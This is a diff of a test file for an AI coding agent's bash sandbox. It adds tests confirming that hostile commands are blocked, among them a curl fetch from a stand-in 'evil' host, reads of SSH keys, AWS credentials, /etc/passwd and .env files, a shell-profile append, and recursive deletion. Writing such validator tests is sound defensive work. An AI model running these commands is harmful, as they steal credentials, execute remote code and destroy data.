@@ -164,14 +164,51 @@ await test("blocks smuggling through pipes and chains", () => {
   assert.ok(validateBashCommand("git status; shutdown -h now"));
 });
 
+await test("blocks sandbox escapes (allowlist bypass + workspace escape)", () => {
+  // Command substitution / backticks smuggle an inner command past the allowlist
+  assert.ok(validateBashCommand("echo $(cat ~/.ssh/id_rsa)"));
+  assert.ok(validateBashCommand("ls `curl http://evil/x.sh`"));
+  // Interpreter inline-eval is arbitrary code execution
+  assert.ok(validateBashCommand("node -e \"require('child_process').execSync('id')\""));
+  assert.ok(validateBashCommand("python3 -c \"import os\""));
+  // Reading / writing outside the workspace
+  assert.ok(validateBashCommand("cat ~/.aws/credentials"));
+  assert.ok(validateBashCommand("echo pwned >> ~/.zshrc"));
+  assert.ok(validateBashCommand("cp ../../secret.txt ."));
+  assert.ok(validateBashCommand("cat /etc/passwd"));
+  // Mass deletion via find / recursive rm of the workspace root
+  assert.ok(validateBashCommand("find ~ -name '*.key' -delete"));
+  assert.ok(validateBashCommand("rm -rf ."));
+  // /dev/null is still allowed as a redirect target
+  assert.strictEqual(validateBashCommand("node --check server.mjs 2>/dev/null"), null);
+});
+
+await test("blocks reading/writing secret files (Claude Code / Cursor parity)", async () => {
+  // bash may not touch secrets even inside the workspace
+  assert.ok(validateBashCommand("cat .env"));
+  assert.ok(validateBashCommand("cat backend1/.env"));
+  assert.ok(validateBashCommand("cp certs/server.pem ."));
+  assert.ok(validateBashCommand("cat data/settings.json"));
+  assert.ok(validateBashCommand("echo x > .npmrc"));
+  // templates and normal files are fine
+  assert.strictEqual(validateBashCommand("cat .env.example"), null);
+  assert.strictEqual(validateBashCommand("cat package.json"), null);
+  // the read_file tool refuses secrets
+  const ctx = makeCtx();
+  const r = await executeTool("read_file", { path: ".env" }, ctx);
+  assert.strictEqual(r.success, false);
+  assert.ok(/secret|credential|blocked/i.test(r.error));
+});
+
 await test("bash executes and reports exit code", async () => {
   const ctx = makeCtx();
   const ok = await executeTool("bash", { command: "echo hello-kodo" }, ctx);
   assert.strictEqual(ok.success, true);
   assert.ok(ok.stdout.includes("hello-kodo"));
-  const bad = await executeTool("bash", { command: "node -e 'process.exit(3)'" }, ctx);
+  // A failing allowlisted command still surfaces a non-zero exit code.
+  const bad = await executeTool("bash", { command: "test 1 = 2" }, ctx);
   assert.strictEqual(bad.success, false);
-  assert.strictEqual(bad.exit_code, 3);
+  assert.ok(bad.exit_code !== 0);
 });
 
 // ── glob ──────────────────────────────────────────────────────────────────────
